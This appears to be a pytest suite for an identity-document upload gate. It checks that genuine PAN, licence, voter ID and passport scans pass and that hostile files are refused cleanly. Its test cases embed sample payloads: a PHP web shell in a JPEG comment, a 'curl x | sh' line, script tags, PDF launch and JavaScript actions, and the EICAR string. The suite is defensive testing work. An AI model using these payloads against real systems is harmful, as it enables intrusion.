"""
IDENTITY-DOCUMENT UPLOADS: ANTIVIRUS + POSITIVE / NEGATIVE TESTS (2026-10-15, go-live hardening).

PAN, driving licence, voter ID and passport, as JPEG, PNG and PDF:

  POSITIVE  every real sample of each type, the synthetic set, and clean PDFs made from them pass the gate -- no
            false alarm on a genuine document (a scanner that refuses customers is not production-ready either)
  NEGATIVE  EICAR, a program renamed or appended to an image, a web shell in a JPEG comment, a script in a PNG
            text chunk, a zip glued after the image, PDFs with JavaScript (also #xx-obfuscated), an attachment, a
            launch action, encryption, a form submit; an image bomb; a corrupt image; text / HTML / SVG named as an
            image; empty, oversized and unsupported files
  ENGINE    the optional antivirus engine: a detection refuses, an outage refuses when required (fail closed) and
            is logged-and-passed when not

Every refusal: a clean 4xx naming the reason, never a 500, never a stack trace or a server path, never an extracted
field, never a file left on disk, and never reaching OCR (a test fails loudly if a refused file gets there).
The EICAR string is assembled at run time and only ever held in memory.
"""

from __future__ import annotations

import io
import json
import struct
import zlib
from pathlib import Path

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from app.security import malware_scan, upload_gate

ROOT = Path(__file__).resolve().parents[2]
LEAKS = ("Traceback", "File \"", "site-packages", "C:\\", "/tmp/", "uploads/")
EICAR = ("X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-" + "TEST-FILE!$H+H*").encode()
DOS_PROGRAM = b"MZ\x90\x00\x03" + b"\x00" * 59 + b"\x0e\x1f\xba\x0e\x00\xb4\t\xcd!This program cannot be run in DOS mode.\r\r\n$"


# ---- real and synthetic samples ---------------------------------------------------------------------------------
def _real_samples() -> list[tuple[str, Path]]:
    truth = json.loads((ROOT / "samples/ground_truth.json").read_text(encoding="utf-8"))
    index = {p.name: p for p in (ROOT / "samples").rglob("*") if p.is_file()}
    out = [(v["document_type"], index[k]) for k, v in truth.items() if not k.startswith("_") and k in index]
    out += [("PASSPORT", p) for p in sorted((ROOT / "samples/passports").glob("*.jpg"))[:6]]
    return out


def _synthetic_samples() -> list[tuple[str, Path]]:
    folder = ROOT / "samples/synthetic/heldout"
    truth_file = folder / "ground_truth.json"
    if not truth_file.is_file():
        return []
    truth = json.loads(truth_file.read_text(encoding="utf-8"))
    return [(v["document_type"], folder / k) for k, v in truth.items() if not k.startswith("_")]


REAL = _real_samples()
SYNTHETIC = _synthetic_samples()
ONE_PER_TYPE = {t: p for t, p in reversed(REAL)}                 # first sample of each type
TYPES = ["PAN", "DRIVING_LICENCE", "VOTER_ID", "PASSPORT"]


def _jpeg(document_type: str = "PAN") -> bytes:
    return ONE_PER_TYPE[document_type].read_bytes()


def _png(document_type: str = "PAN") -> bytes:
    from PIL import Image

    buffer = io.BytesIO()
    with Image.open(ONE_PER_TYPE[document_type]) as image:
        image.convert("RGB").save(buffer, "PNG")
    return buffer.getvalue()


def _pdf(document_type: str = "PAN") -> bytes:
    from PIL import Image

    buffer = io.BytesIO()
    with Image.open(ONE_PER_TYPE[document_type]) as image:
        image.convert("RGB").save(buffer, "PDF")
    return buffer.getvalue()


def _png_chunk(kind: bytes, data: bytes) -> bytes:
    return struct.pack(">I", len(data)) + kind + data + struct.pack(">I", zlib.crc32(kind + data) & 0xFFFFFFFF)


def _png_with_text(text: bytes) -> bytes:
    png = _png()
    iend = png.rfind(b"IEND") - 4
    return png[:iend] + _png_chunk(b"tEXt", b"Comment\x00" + text) + png[iend:]


def _png_bomb() -> bytes:
    """A valid PNG header claiming 50 000 x 50 000 pixels (2.5 gigapixels) with a tiny body."""
    ihdr = struct.pack(">IIBBBBB", 50000, 50000, 8, 0, 0, 0, 0)
    return (b"\x89PNG\r\n\x1a\n" + _png_chunk(b"IHDR", ihdr) + _png_chunk(b"IDAT", zlib.compress(b"\x00" * 64))
            + _png_chunk(b"IEND", b""))


def _jpeg_with_comment(comment: bytes) -> bytes:
    data = _jpeg()
    return data[:2] + b"\xff\xfe" + struct.pack(">H", len(comment) + 2) + comment + data[2:]


def _pdf_with(body: bytes) -> bytes:
    pdf = _pdf()
    return pdf.replace(b"%%EOF", body + b"\n%%EOF", 1) if b"%%EOF" in pdf else pdf + body


# ---- the cases ---------------------------------------------------------------------------------------------------
HOSTILE = [
    # (id, filename, bytes builder, expected code)
    ("eicar-as-jpg", "pan.jpg", lambda: EICAR, "EICAR_TEST_FILE"),
    ("eicar-as-pdf", "pan.pdf", lambda: EICAR, "EICAR_TEST_FILE"),
    ("eicar-appended-to-jpeg", "pan.jpg", lambda: EICAR + b"\n" + _jpeg(), "EICAR_TEST_FILE"),
    ("exe-renamed-jpg", "pan.jpg", lambda: DOS_PROGRAM + b"\x00" * 200, None),
    ("exe-renamed-pdf", "pan.pdf", lambda: DOS_PROGRAM + b"\x00" * 200, None),
    ("exe-appended-to-jpeg", "dl.jpg", lambda: _jpeg("DRIVING_LICENCE") + DOS_PROGRAM, "EMBEDDED_EXECUTABLE"),
    ("exe-inside-png", "voter.png", lambda: _png_with_text(DOS_PROGRAM), "EMBEDDED_EXECUTABLE"),
    ("exe-inside-pdf", "passport.pdf", lambda: _pdf_with(DOS_PROGRAM), "EMBEDDED_EXECUTABLE"),
    ("elf-renamed-png", "pan.png", lambda: b"\x7fELF\x02\x01\x01" + b"\x00" * 200, None),
    ("zip-appended-to-jpeg", "pan.jpg", lambda: _jpeg() + b"PK\x03\x04" + b"\x00" * 100, "POLYGLOT_TRAILER"),
    ("rar-appended-to-png", "voter.png", lambda: _png("VOTER_ID") + b"Rar!\x1a\x07\x00" + b"\x00" * 50,
     "POLYGLOT_TRAILER"),
    ("shell-appended-to-jpeg", "dl.jpg", lambda: _jpeg() + b"#!/bin/sh\ncurl x | sh\n", "SCRIPT_IN_IMAGE"),
    ("php-in-jpeg-comment", "pan.jpg", lambda: _jpeg_with_comment(b"<?php system($_GET['c']); ?>"),
     "SCRIPT_IN_IMAGE"),
    ("script-in-png-text", "passport.png", lambda: _png_with_text(b"<script>fetch('//x')</script>"),
     "SCRIPT_IN_IMAGE"),
    ("powershell-in-jpeg", "pan.jpg", lambda: _jpeg_with_comment(b"powershell -enc AAAA"), "SCRIPT_IN_IMAGE"),
    ("pdf-javascript", "pan.pdf", lambda: _pdf_with(b"9 0 obj << /S /JavaScript /JS (app.alert(1)) >> endobj"),
     "PDF_ACTIVE_CONTENT"),
    ("pdf-javascript-obfuscated", "dl.pdf", lambda: _pdf_with(b"9 0 obj << /S /J#61vaScript /J#53 (x) >> endobj"),
     "PDF_ACTIVE_CONTENT"),
    ("pdf-attachment", "voter.pdf", lambda: _pdf_with(b"9 0 obj << /Type /EmbeddedFile /Length 4 >> endobj"),
     "PDF_ACTIVE_CONTENT"),
    ("pdf-launch", "passport.pdf", lambda: _pdf_with(b"9 0 obj << /S /Launch /F (cmd.exe) >> endobj"), None),
    ("pdf-encrypted", "pan.pdf", lambda: _pdf_with(b"trailer << /Encrypt 9 0 R >>"), "PDF_ACTIVE_CONTENT"),
    ("pdf-submit-form", "pan.pdf", lambda: _pdf_with(b"9 0 obj << /S /SubmitForm /F (http://x) >> endobj"),
     "PDF_ACTIVE_CONTENT"),
    ("pdf-rich-media", "pan.pdf", lambda: _pdf_with(b"9 0 obj << /Subtype /RichMedia >> endobj"),
     "PDF_ACTIVE_CONTENT"),
    ("image-bomb", "pan.png", _png_bomb, "IMAGE_BOMB"),
    ("corrupt-jpeg", "pan.jpg", lambda: b"\xff\xd8\xff\xe0" + bytes(range(256)) * 8, "CORRUPT_IMAGE"),
    ("truncated-png", "pan.png", lambda: _png()[:300], "CORRUPT_IMAGE"),
    ("text-named-jpg", "pan.jpg", lambda: b"just some text, not an image at all", None),
    ("html-named-png", "pan.png", lambda: b"<html><body>hi</body></html>", None),
    ("svg-named-jpg", "pan.jpg", lambda: b"<svg onload=alert(1)>", None),
    ("zip-named-pdf", "pan.pdf", lambda: b"PK\x03\x04" + b"\x00" * 200, None),
]


# ---- unit level: the gate itself ---------------------------------------------------------------------------------
@pytest.mark.parametrize("case", HOSTILE, ids=[c[0] for c in HOSTILE])
def test_the_gate_refuses_every_hostile_file(case):
    _, name, build, code = case
    verdict = upload_gate.check(build(), name, identity=True)
    assert not verdict.allowed, case[0]
    if code:
        # a script in the first kilobyte is already refused by the older signature check (MALICIOUS_CONTENT)
        assert verdict.code in (code, "MALICIOUS_CONTENT" if code == "SCRIPT_IN_IMAGE" else code), (case[0], verdict)


@pytest.mark.parametrize("document_type,path", REAL, ids=[f"{t}-{p.name}" for t, p in REAL])
def test_every_real_document_passes_the_gate(document_type, path):
    verdict = upload_gate.check(path.read_bytes(), path.name, identity=True)
    assert verdict.allowed, (document_type, path.name, verdict)


def test_the_whole_synthetic_set_passes_the_gate():
    if not SYNTHETIC:
        pytest.skip("synthetic set not generated (python -m evals.documents.synthetic)")
    refused = [(t, p.name, v.code) for t, p in SYNTHETIC
               if not (v := upload_gate.check(p.read_bytes(), p.name, identity=True)).allowed]
    assert refused == [], refused


@pytest.mark.parametrize("document_type", TYPES)
@pytest.mark.parametrize("fmt", ["jpg", "png", "pdf"])
def test_a_clean_document_in_every_format_passes(document_type, fmt):
    data = {"jpg": _jpeg, "png": _png, "pdf": _pdf}[fmt](document_type)
    assert upload_gate.check(data, f"doc.{fmt}", identity=True).allowed


def test_a_phone_photo_trailer_is_not_a_payload():
    """Phones append their own metadata after the JPEG end; only a program / archive / script there is refused."""
    assert upload_gate.check(_jpeg() + b"SEFH" + b"\x00" * 64 + b"Samsung_Capture_Info", "pan.jpg").allowed


def test_the_strict_pdf_rules_are_for_identity_documents_only():
    """A bank's e-statement may carry a form script; only a launch action is refused there."""
    scripted = _pdf_with(b"9 0 obj << /S /JavaScript /JS (x) >> endobj")
    assert not upload_gate.check(scripted, "pan.pdf", identity=True).allowed
    assert upload_gate.check(scripted, "statement.pdf", identity=False).allowed
    launch = _pdf_with(b"9 0 obj << /S /Launch /F (cmd.exe) >> endobj")
    assert not upload_gate.check(launch, "statement.pdf", identity=False).allowed


def test_the_scan_is_fast_enough_for_the_upload_path():
    import time

    data = _pdf("DRIVING_LICENCE")
    started = time.perf_counter()
    for _ in range(10):
        upload_gate.check(data, "dl.pdf", identity=True)
    assert (time.perf_counter() - started) / 10 < 0.25


# ---- the optional antivirus engine ------------------------------------------------------------------------------
def test_an_engine_detection_refuses(monkeypatch):
    monkeypatch.setenv("UPLOAD_AV_ENGINE", "clamd")
    monkeypatch.setattr(malware_scan, "_ENGINES", {"clamd": lambda content: malware_scan.Finding(
        "MALWARE_DETECTED", "The antivirus engine flagged this file.")})
    verdict = upload_gate.check(_jpeg(), "pan.jpg", identity=True)
    assert not verdict.allowed and verdict.code == "MALWARE_DETECTED"


def _engine_down(content):
    raise ConnectionRefusedError("clamd not running")


def test_an_engine_outage_fails_closed_when_required(monkeypatch):
    monkeypatch.setenv("UPLOAD_AV_ENGINE", "clamd")
    monkeypatch.setenv("UPLOAD_AV_REQUIRED", "true")
    monkeypatch.setattr(malware_scan, "_ENGINES", {"clamd": _engine_down})
    verdict = upload_gate.check(_jpeg(), "pan.jpg", identity=True)
    assert not verdict.allowed and verdict.code == "AV_SCAN_UNAVAILABLE"


def test_an_engine_outage_is_logged_and_passed_when_not_required(monkeypatch, caplog):
    monkeypatch.setenv("UPLOAD_AV_ENGINE", "clamd")
    monkeypatch.delenv("UPLOAD_AV_REQUIRED", raising=False)
    monkeypatch.setattr(malware_scan, "_ENGINES", {"clamd": _engine_down})
    assert upload_gate.check(_jpeg(), "pan.jpg", identity=True).allowed
    assert "unavailable" in caplog.text.lower()


def test_an_unknown_engine_name_is_not_silently_ignored_when_required(monkeypatch):
    monkeypatch.setenv("UPLOAD_AV_ENGINE", "kaspersky-typo")
    monkeypatch.setenv("UPLOAD_AV_REQUIRED", "true")
    assert upload_gate.check(_jpeg(), "pan.jpg").code == "AV_SCAN_UNAVAILABLE"


def test_the_eicar_string_is_not_stored_whole_in_the_source():
    """An on-access scanner would quarantine the module itself."""
    source = Path(malware_scan.__file__).read_bytes()
    assert EICAR not in source


# ---- API level: both identity routes ----------------------------------------------------------------------------
@pytest.fixture
def client(auth_headers, monkeypatch):
    from app.api.routes import document_agent_api, document_extraction_api

    def _no_ocr(*_args, **_kwargs):
        raise AssertionError("a refused upload reached the OCR pipeline")

    monkeypatch.setattr(document_extraction_api, "run_agent", _no_ocr)
    monkeypatch.setattr("app.agents.document_agent.workflow.run_document", _no_ocr)
    app = FastAPI()
    app.include_router(document_extraction_api.router, prefix="/api/v1")
    app.include_router(document_agent_api.router, prefix="/api/v1")
    c = TestClient(app, raise_server_exceptions=False)
    c.headers.update(auth_headers)
    return c


def _clean_refusal(response, *codes):
    text = response.text
    assert response.status_code in codes, (response.status_code, text[:300])
    assert not [leak for leak in LEAKS if leak in text], text[:300]
    body = response.json()
    assert body.get("fields") in (None, {}), text[:300]                  # nothing extracted


@pytest.mark.parametrize("case", HOSTILE, ids=[c[0] for c in HOSTILE])
def test_extract_document_refuses_hostile_uploads(client, case):
    _, name, build, _ = case
    _clean_refusal(client.post("/api/v1/extract-document", files={"file": (name, io.BytesIO(build()))}), 415, 422)


@pytest.mark.parametrize("case", HOSTILE, ids=[c[0] for c in HOSTILE])
def test_document_agent_refuses_hostile_uploads(client, case):
    _, name, build, _ = case
    _clean_refusal(client.post("/api/v1/document-agent", files={"file": (name, io.BytesIO(build()))},
                               data={"operation": "EXTRACT", "expected_type": "PAN"}), 400, 415, 422)


def test_the_refusal_keeps_the_extraction_contract(client):
    """422 + a DocumentExtractionResult with status FAILED and the reason -- the shape callers already branch on."""
    response = client.post("/api/v1/extract-document", files={"file": ("pan.jpg", io.BytesIO(EICAR))})
    assert response.status_code == 422
    body = response.json()
    assert body["status"] == "FAILED" and any("EICAR_TEST_FILE" in e for e in body["errors"])


@pytest.mark.parametrize("name", ["pan.exe", "pan.html", "pan.svg", "pan", "pan.jpg.exe", "pan.docx"])
def test_unsupported_extensions_are_415(client, name):
    response = client.post("/api/v1/extract-document", files={"file": (name, io.BytesIO(_png()))})
    assert response.status_code in (400, 415)


@pytest.mark.parametrize("path,form", [("/api/v1/extract-document", {}),
                                       ("/api/v1/document-agent", {"operation": "EXTRACT"})])
def test_empty_files_are_400(client, path, form):
    assert client.post(path, files={"file": ("pan.jpg", io.BytesIO(b""))}, data=form).status_code == 400


@pytest.mark.parametrize("path,form", [("/api/v1/extract-document", {}),
                                       ("/api/v1/document-agent", {"operation": "EXTRACT"})])
def test_oversized_files_are_413(client, path, form):
    from app.agents.document_agent.workflow import MAX_UPLOAD_BYTES

    big = b"\xff\xd8\xff" + b"\x00" * (MAX_UPLOAD_BYTES + 10)
    assert client.post(path, files={"file": ("pan.jpg", io.BytesIO(big))}, data=form).status_code == 413


@pytest.mark.parametrize("case", [c for c in HOSTILE if c[1].endswith(".pdf")], ids=lambda c: c[0])
def test_a_refused_pdf_never_touches_the_disk(client, case):
    from app.api.routes.document_extraction_api import UPLOAD_ROOT

    before = set(UPLOAD_ROOT.glob("*")) if UPLOAD_ROOT.exists() else set()
    client.post("/api/v1/extract-document", files={"file": (case[1], io.BytesIO(case[2]()))})
    after = set(UPLOAD_ROOT.glob("*")) if UPLOAD_ROOT.exists() else set()
    assert after == before


def test_a_bad_operation_is_422(client):
    assert client.post("/api/v1/document-agent", files={"file": ("pan.png", io.BytesIO(_png()))},
                       data={"operation": "DELETE"}).status_code == 422


def test_the_batch_route_reports_a_hostile_file_per_file(client):
    files = [("files", ("pan.jpg", io.BytesIO(EICAR))), ("files", ("dl.pdf", io.BytesIO(DOS_PROGRAM)))]
    body = client.post("/api/v1/extract-document/batch", files=files).json()
    assert body["failed"] == 2 and all(r["status"] == "failed" for r in body["results"])
    assert not [leak for leak in LEAKS if leak in json.dumps(body)]


# ---- positive, end to end: a clean upload of each type is read (real OCR) ---------------------------------------
@pytest.fixture
def live_client(auth_headers):
    from app.api.routes import document_extraction_api

    app = FastAPI()
    app.include_router(document_extraction_api.router, prefix="/api/v1")
    c = TestClient(app)
    c.headers.update(auth_headers)
    return c


@pytest.mark.parametrize("document_type", TYPES)
def test_a_clean_upload_of_each_type_is_read(live_client, document_type):
    path = ONE_PER_TYPE[document_type]
    response = live_client.post("/api/v1/extract-document", files={"file": (path.name, path.read_bytes())})
    assert response.status_code in (200, 422), response.text[:300]      # 422 = read but incomplete, never refused
    body = response.json()
    assert body["document_type"] == document_type, (document_type, body.get("document_type"), body.get("errors"))
    assert not any(code in " ".join(body.get("errors") or []) for code in
                   ("EICAR", "EMBEDDED_EXECUTABLE", "SCRIPT_IN_IMAGE", "POLYGLOT", "PDF_ACTIVE", "IMAGE_BOMB",
                    "CORRUPT_IMAGE", "MALWARE"))


# ---- the earlier hardening, kept ---------------------------------------------------------------------------------
def test_a_failed_pdf_page_render_leaves_no_pages(tmp_path, monkeypatch):
    """A render that fails on page two removes page one too -- no full-resolution ID image is left behind."""
    import sys
    import types

    from app.api.routes.document_extraction_api import _pdf_pages_to_images

    class _Page:
        def __init__(self, fail):
            self.fail = fail

        def save(self, target, *_a, **_k):
            if self.fail:
                raise OSError("disk full")
            Path(target).write_bytes(b"jpeg")

    fake = types.ModuleType("pdf2image")
    fake.convert_from_path = lambda *_a, **_k: [_Page(False), _Page(True)]
    monkeypatch.setitem(sys.modules, "pdf2image", fake)
    pdf = tmp_path / "id.pdf"
    pdf.write_bytes(b"%PDF-1.4")
    with pytest.raises(OSError):
        _pdf_pages_to_images(pdf)
    assert list(tmp_path.glob("*.jpg")) == []


def test_pan_holder_type_is_one_list_everywhere():
    """The extractor, the classifier and validation accept the same 4th characters -- E (LLP) and K included."""
    from app.agents.document_agent import classify, validate
    from app.agents.document_agent.fields import pan
    from app.agents.document_agent.schemas import ValidationStatus

    for ch in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        value = f"ABC{ch}E1234F"
        extracted = bool(pan._PAN_EXACT.match(value))
        classified = bool(classify._PAN_NUMBER_RE.search(value))
        valid = validate.validate_pan(value)[0] is ValidationStatus.VALID
        assert extracted == classified == valid, (ch, extracted, classified, valid)


# ---- expected_type: what callers send ----------------------------------------------------------------------------
@pytest.mark.parametrize("sent", ["PAN", "pan", "PAN_CARD", "PAN CARD", "Pan-Card", "pancard"])
def test_a_genuine_pan_is_never_a_type_mismatch_for_any_spelling_of_pan(live_agent_client, sent):
    """2026-10-15: a real PAN sent with expected_type=PAN_CARD was REJECTED as DOCUMENT_TYPE_MISMATCH."""
    body = live_agent_client.post("/api/v1/document-agent", files={"file": ("pan.jpg", _jpeg("PAN"))},
                                  data={"operation": "VERIFY", "expected_type": sent}).json()
    assert "DOCUMENT_TYPE_MISMATCH" not in json.dumps(body), (sent, body.get("verification"))
    assert (body.get("document") or {}).get("type") == "PAN"


def test_a_pan_sent_as_a_licence_is_still_a_mismatch(live_agent_client):
    body = live_agent_client.post("/api/v1/document-agent", files={"file": ("pan.jpg", _jpeg("PAN"))},
                                  data={"operation": "VERIFY", "expected_type": "DL"}).json()
    assert body["status"] == "REJECTED"
    assert {"DOCUMENT_TYPE_MISMATCH", "DOC_CLASS_MISMATCH"} & set(body["verification"]["reason_codes"])


@pytest.mark.parametrize("sent", ["AADHAR_XYZ", "RATION", "SELFIE"])
def test_an_unknown_expected_type_is_a_422_naming_the_accepted_values(client, sent):
    r = client.post("/api/v1/document-agent", files={"file": ("pan.jpg", io.BytesIO(_jpeg()))},
                    data={"operation": "VERIFY", "expected_type": sent})
    assert r.status_code == 422
    detail = r.json()["detail"]
    assert detail["error"] == "UNKNOWN_EXPECTED_TYPE" and "PAN" in detail["accepted"]


@pytest.fixture
def live_agent_client(auth_headers):
    from app.api.routes import document_agent_api

    app = FastAPI()
    app.include_router(document_agent_api.router, prefix="/api/v1")
    c = TestClient(app)
    c.headers.update(auth_headers)
    return c
